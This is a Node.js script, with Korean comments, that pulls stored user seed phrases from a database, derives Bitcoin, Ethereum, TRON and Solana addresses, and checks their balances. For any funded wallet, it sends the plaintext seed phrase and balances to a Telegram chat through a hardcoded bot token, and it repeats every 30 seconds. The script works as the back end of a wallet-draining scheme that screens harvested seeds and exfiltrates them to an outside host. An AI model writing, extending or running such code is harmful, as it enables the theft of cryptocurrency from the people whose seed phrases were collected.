/**
 * 🔍 시드 문구 잔고 검수 시스템 (JS 버전 — seed_checker.py 동일 기능)
 *
 * 지원 체인: BTC / ETH / TRON / SOL
 * DB 저장: seeds.btc, eth, tron, sol, balance, usdt_balance, checked, checked_at
 */

'use strict';

const cron    = require('node-cron');
const axios   = require('axios');
const ethers  = require('ethers');
const crypto  = require('crypto');
const db      = require('./db');

// ─────────────────────────────────────────
//  설정
// ─────────────────────────────────────────
const CONFIG = {
  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ',
  TELEGRAM_CHAT_ID:   process.env.TELEGRAM_CHAT_ID   || '-1003732339035',
  CRON_SCHEDULE:      process.env.SEED_CRON_SCHEDULE  || '*/30 * * * * *',
  BATCH_SIZE:         parseInt(process.env.SEED_BATCH_SIZE    || '1'),
  MIN_BALANCE:        0,
};

// ─────────────────────────────────────────
//  Base58 / Base58Check (BTC P2PKH, TRON 주소용)
// ─────────────────────────────────────────
const B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

function base58Encode(buf) {
  let n = BigInt('0x' + buf.toString('hex') || '00');
  let result = '';
  const base = 58n;
  while (n > 0n) {
    result = B58_CHARS[Number(n % base)] + result;
    n /= base;
  }
  for (const b of buf) {
    if (b !== 0) break;
    result = '1' + result;
  }
  return result;
}

function base58CheckEncode(versionByte, payload) {
  const data = Buffer.concat([Buffer.from([versionByte]), payload]);
  const checksum = crypto.createHash('sha256')
    .update(crypto.createHash('sha256').update(data).digest()).digest().slice(0, 4);
  return base58Encode(Buffer.concat([data, checksum]));
}

// ─────────────────────────────────────────
//  RIPEMD-160 (BTC hash160용)
//  — @noble/hashes 우선, 없으면 Node.js crypto fallback
// ─────────────────────────────────────────
let _ripemd160;
try {
  const { ripemd160 } = require('@noble/hashes/ripemd160');
  _ripemd160 = (d) => Buffer.from(ripemd160(d));
} catch {
  _ripemd160 = (d) => crypto.createHash('ripemd160').update(d).digest();
}

function hash160(data) {
  const sha = crypto.createHash('sha256').update(data).digest();
  return _ripemd160(sha);
}

// ─────────────────────────────────────────
//  ed25519-hd-key (SOL 파생용)
// ─────────────────────────────────────────
let ed25519HdKey = null;
try { ed25519HdKey = require('ed25519-hd-key'); } catch { /* SOL 스킵 */ }

// ─────────────────────────────────────────
//  텔레그램
// ─────────────────────────────────────────
async function sendTelegram(message, botToken, chatId) {
  const token = botToken || CONFIG.TELEGRAM_BOT_TOKEN;
  const chat  = chatId   || CONFIG.TELEGRAM_CHAT_ID;
  try {
    const res = await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      { chat_id: chat, text: message, parse_mode: 'HTML' },
      { timeout: 10000 }
    );
    if (res.data.ok) { console.log('✅ 텔레그램 전송 성공'); return true; }
    console.error('❌ 텔레그램 전송 실패:', res.data);
    return false;
  } catch (e) {
    console.error('❌ 텔레그램 전송 오류:', e.message);
    return false;
  }
}

// ─────────────────────────────────────────
//  BTC 잔고 확인  (m/44'/0'/0'/0/0 → P2PKH)
// ─────────────────────────────────────────
async function checkBtc(phrase) {
  try {
    const wallet = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/0'/0'/0/0");
    const compressedPub = Buffer.from(wallet.publicKey.slice(2), 'hex'); // 33 bytes
    const address = base58CheckEncode(0x00, hash160(compressedPub));
    console.log(`[BTC] Address: ${address}`);

    const apis = [
      `https://blockstream.info/api/address/${address}`,
      `https://mempool.space/api/address/${address}`,
    ];

    for (const url of apis) {
      try {
        const { data } = await axios.get(url, { timeout: 10000 });
        const confirmed   = (data.chain_stats?.funded_txo_sum   || 0) - (data.chain_stats?.spent_txo_sum   || 0);
        const unconfirmed = (data.mempool_stats?.funded_txo_sum || 0) - (data.mempool_stats?.spent_txo_sum || 0);
        const btc = (confirmed + unconfirmed) / 1e8;
        console.log(`[BTC] Balance: ${btc} BTC`);
        return { network: 'btc', symbol: 'BTC', address, balance: btc };
      } catch (e) {
        console.log(`[BTC] API 실패: ${url} → ${e.message}`);
      }
    }
    throw new Error('BTC API 전부 실패');
  } catch (e) {
    console.error('[BTC] 오류:', e.message);
    return { network: 'btc', symbol: 'BTC', address: '', balance: 0, error: e.message };
  }
}

// ─────────────────────────────────────────
//  ETH 잔고 확인  (m/44'/60'/0'/0/0)
// ─────────────────────────────────────────
async function checkEth(phrase) {
  try {
    const wallet  = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/60'/0'/0/0");
    const address = wallet.address;
    console.log(`[ETH] Address: ${address}`);

    const rpcs = [
      'https://cloudflare-eth.com',
      'https://ethereum-rpc.publicnode.com',
      'https://rpc.ankr.com/eth',
    ];

    for (const rpc of rpcs) {
      try {
        const provider = new ethers.JsonRpcProvider(rpc, null, { staticNetwork: true, timeout: 10000 });
        const bal = await provider.getBalance(address);
        const eth = parseFloat(ethers.formatEther(bal));
        console.log(`[ETH] Balance: ${eth} ETH`);
        return { network: 'eth', symbol: 'ETH', address, balance: eth };
      } catch (e) {
        console.log(`[ETH] RPC 실패: ${rpc} → ${e.message}`);
      }
    }
    throw new Error('ETH RPC 전부 실패');
  } catch (e) {
    console.error('[ETH] 오류:', e.message);
    return { network: 'eth', symbol: 'ETH', address: '', balance: 0, error: e.message };
  }
}

// ─────────────────────────────────────────
//  TRON 잔고 확인  (m/44'/195'/0'/0/0 → Base58Check 0x41)
// ─────────────────────────────────────────
async function checkTron(phrase) {
  try {
    const wallet = ethers.HDNodeWallet.fromPhrase(phrase, '', "m/44'/195'/0'/0/0");
    // 비압축 공개키 (0x04 + 64bytes) 취득 — compressed=false
    const uncompressedPub = ethers.SigningKey.computePublicKey(wallet.privateKey, false);
    // "0x04xxxx..." → "04" 2글자(0x 제거 후 04) 포함 → slice(4)로 64바이트 payload
    const pubBytes = Buffer.from(uncompressedPub.slice(4), 'hex'); // 64 bytes
    const keccak   = Buffer.from(ethers.keccak256(pubBytes).slice(2), 'hex'); // 32 bytes
    const address  = base58CheckEncode(0x41, keccak.slice(12)); // last 20 bytes, prefix 0x41

    console.log(`[TRON] Address: ${address}`);

    const apis = [
      'https://api.trongrid.io/wallet/getaccount',
      'https://api.tronstack.io/wallet/getaccount',
    ];

    const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC-20 컨트랙트

    for (const url of apis) {
      try {
        const { data } = await axios.post(url, { address, visible: true }, { timeout: 10000 });
        const trx = (data.balance || 0) / 1e6;
        // TRC-20 USDT 잔고 파싱
        let usdt = 0;
        if (Array.isArray(data.trc20)) {
          const entry = data.trc20.find(t => t[USDT_TRC20] !== undefined);
          if (entry) usdt = parseInt(entry[USDT_TRC20] || 0) / 1e6;
        }
        console.log(`[TRON] TRX: ${trx}, USDT: ${usdt}`);
        return { network: 'tron', symbol: 'TRX', address, balance: trx, usdt };
      } catch (e) {
        console.log(`[TRON] API 실패: ${url} → ${e.message}`);
      }
    }
    throw new Error('TRON API 전부 실패');
  } catch (e) {
    console.error('[TRON] 오류:', e.message);
    return { network: 'tron', symbol: 'TRX', address: '', balance: 0, error: e.message };
  }
}

// ─────────────────────────────────────────
//  SOL 잔고 확인  (SLIP-0010 ed25519, m/44'/501'/0'/0')
// ─────────────────────────────────────────
async function checkSol(phrase) {
  if (!ed25519HdKey) {
    console.log('[SOL] ed25519-hd-key 없음, 스킵');
    return { network: 'sol', symbol: 'SOL', address: '', balance: 0 };
  }
  try {
    const mnemonicObj = ethers.Mnemonic.fromPhrase(phrase);
    const seedBuf = Buffer.from(mnemonicObj.computeSeed()); // Uint8Array → Buffer
    const seedHex = seedBuf.toString('hex');

    const { key } = ed25519HdKey.derivePath("m/44'/501'/0'/0'", seedHex);
    const pubKey  = ed25519HdKey.getPublicKey(key, false); // 32 bytes Uint8Array

    // SOL 주소 = plain base58 (no checksum)
    const address = base58Encode(Buffer.from(pubKey));
    console.log(`[SOL] Address: ${address}`);

    const { data } = await axios.post(
      'https://api.mainnet-beta.solana.com',
      { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address] },
      { timeout: 10000 }
    );
    const sol = (data.result?.value || 0) / 1e9;
    console.log(`[SOL] Balance: ${sol} SOL`);
    return { network: 'sol', symbol: 'SOL', address, balance: sol };
  } catch (e) {
    console.error('[SOL] 오류:', e.message);
    return { network: 'sol', symbol: 'SOL', address: '', balance: 0, error: e.message };
  }
}

// ─────────────────────────────────────────
//  멀티체인 검사
// ─────────────────────────────────────────
async function checkAllChains(phrase) {
  const results = [];
  for (const fn of [checkBtc, checkEth, checkTron, checkSol]) {
    try { results.push(await fn(phrase)); }
    catch (e) { console.error('체인 검사 오류:', e.message); }
  }
  return results;
}

// checkMultiChainBalance 는 server.js 이전 참조용 alias
const checkMultiChainBalance = checkAllChains;

// ─────────────────────────────────────────
//  DB 저장 (btc/eth/tron/sol 각각 + balance/usdt_balance)
// ─────────────────────────────────────────
async function saveBalanceToDB(seedId, btc, eth, tron, sol, usdt = 0) {
  const maxBalance = Math.max(btc, eth, tron, sol, 0);
  try {
    await db.pool.query(
      `UPDATE seeds SET balance=?, btc=?, eth=?, tron=?, sol=?, usdt_balance=? WHERE id=?`,
      [maxBalance, btc || null, eth || null, tron || null, sol || null, usdt || null, seedId]
    );
    console.log(`💾 DB 저장: ID=${seedId} BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} USDT=${usdt}`);
  } catch (e) {
    console.error('❌ DB 저장 실패:', e.message);
  }
}

async function markAsChecked(seedId) {
  try {
    await db.pool.query('UPDATE seeds SET checked=1, checked_at=NOW() WHERE id=?', [seedId]);
    console.log(`✅ 검수 완료 처리: ID=${seedId}`);
  } catch (e) {
    console.error('❌ 검수 완료 처리 실패:', e.message);
  }
}

// ─────────────────────────────────────────
//  시드 한 개 처리 (seeds 테이블)
// ─────────────────────────────────────────
async function processSeed(seedData) {
  const { id, user_id, phrase, created_at } = seedData;
  console.log(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`🔍 시드 검수 시작 (ID=${id}, 사용자=${user_id})`);

  try {
    const results = await checkAllChains(phrase);

    const getbal  = (net) => results.find(r => r.network === net)?.balance || 0;
    const getUsdt = (net) => results.find(r => r.network === net)?.usdt    || 0;
    const btc   = getbal('btc');
    const eth   = getbal('eth');
    const tron  = getbal('tron');
    const sol   = getbal('sol');
    // USDT: TRON TRC-20 기준 (추후 ETH ERC-20 추가 가능)
    const usdt  = getUsdt('tron');

    await saveBalanceToDB(id, btc, eth, tron, sol, usdt);

    // 잔고 있는 체인: native 잔고 또는 USDT 잔고 있는 경우 포함
    const chainsWithBalance = results.filter(r => (r.balance || 0) > CONFIG.MIN_BALANCE || (r.usdt || 0) > CONFIG.MIN_BALANCE);

    console.log(`📊 요약: BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol} USDT(TRC-20)=${usdt} (잔고 있는 체인: ${chainsWithBalance.length}개)`);

    if (chainsWithBalance.length > 0) {
      let msg = `🚨 <b>잔고 발견!</b>\n\n`;
      msg += `👤 <b>사용자:</b> ${user_id}\n`;
      msg += `🆔 <b>시드 ID:</b> ${id}\n`;
      const dt = created_at instanceof Date ? created_at.toISOString().replace('T', ' ').slice(0, 19) : String(created_at);
      msg += `📅 <b>수신일:</b> ${dt}\n\n`;

      for (const c of chainsWithBalance) {
        msg += `━━━━━━━━━━━━━━━━━━\n`;
        msg += `🌐 <b>${c.network.toUpperCase()}</b>\n`;
        msg += `💰 <b>잔고:</b> ${c.balance} ${c.symbol}\n`;
        if ((c.usdt || 0) > 0) msg += `💵 <b>USDT:</b> ${c.usdt} USDT\n`;
        if (c.address) msg += `🔑 <b>주소:</b> <code>${c.address}</code>\n`;
      }
      msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n━━━━━━━━━━━━━━━━━━`;

      await sendTelegram(msg);
    } else {
      console.log(`📭 잔고 없음 (ID=${id})`);
    }

    await markAsChecked(id);
  } catch (e) {
    console.error(`❌ 시드 처리 오류 (ID=${id}):`, e.message);
  }
}

// ─────────────────────────────────────────
//  DB에서 미검수 시드 조회
// ─────────────────────────────────────────
async function getUncheckedSeeds() {
  try {
    const [rows] = await db.pool.query(
      `SELECT id, user_id, phrase, created_at
       FROM seeds
       WHERE (checked IS NULL OR checked = 0)
          OR btc IS NULL OR eth IS NULL OR tron IS NULL OR sol IS NULL
       ORDER BY created_at ASC
       LIMIT ?`,
      [CONFIG.BATCH_SIZE]
    );
    return rows;
  } catch (e) {
    console.error('❌ DB 조회 오류:', e.message);
    return [];
  }
}

// ─────────────────────────────────────────
//  스케줄러
// ─────────────────────────────────────────
async function runCheck() {
  try {
    const seeds = await getUncheckedSeeds();
    if (seeds.length === 0) {
      console.log(`📭 미검수 시드 없음 (${new Date().toISOString()})`);
      return;
    }
    console.log(`🔍 ${seeds.length}개 시드 검수 시작...`);
    for (const seed of seeds) {
      await processSeed(seed);
      await new Promise(r => setTimeout(r, 1000));
    }
    console.log(`✅ 검수 완료 (${seeds.length}개)`);
  } catch (e) {
    console.error('❌ 스케줄러 오류:', e.message);
  }
}

// ─────────────────────────────────────────
//  스키마 확인 (checked 컬럼)
// ─────────────────────────────────────────
async function ensureCheckedColumn() {
  try {
    const [cols] = await db.pool.query("SHOW COLUMNS FROM seeds LIKE 'checked'");
    if (cols.length === 0) {
      await db.pool.query('ALTER TABLE seeds ADD COLUMN checked BOOLEAN DEFAULT FALSE');
      await db.pool.query('ALTER TABLE seeds ADD COLUMN checked_at DATETIME');
      console.log('✅ seeds 테이블에 checked 컬럼 추가됨');
    }
  } catch (e) {
    console.error('❌ 테이블 스키마 업데이트 실패:', e.message);
  }
}

// ─────────────────────────────────────────
//  메인
// ─────────────────────────────────────────
async function main() {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('🔍 시드 문구 잔고 검수 시스템 시작 (JS)');
  console.log(`📨 텔레그램 채팅: ${CONFIG.TELEGRAM_CHAT_ID}`);
  console.log(`⏱️  스케줄: ${CONFIG.CRON_SCHEDULE}`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  await ensureCheckedColumn();

  const testOk = await sendTelegram('✅ 시드 문구 검수 시스템(JS)이 시작되었습니다!');
  if (!testOk) { console.error('❌ 텔레그램 연결 실패'); process.exit(1); }

  await runCheck();

  cron.schedule(CONFIG.CRON_SCHEDULE, runCheck);
}

if (require.main === module) {
  main().catch(e => { console.error('❌ 치명적 오류:', e); process.exit(1); });
}

module.exports = { checkBtc, checkEth, checkTron, checkSol, checkAllChains, checkMultiChainBalance, processSeed };
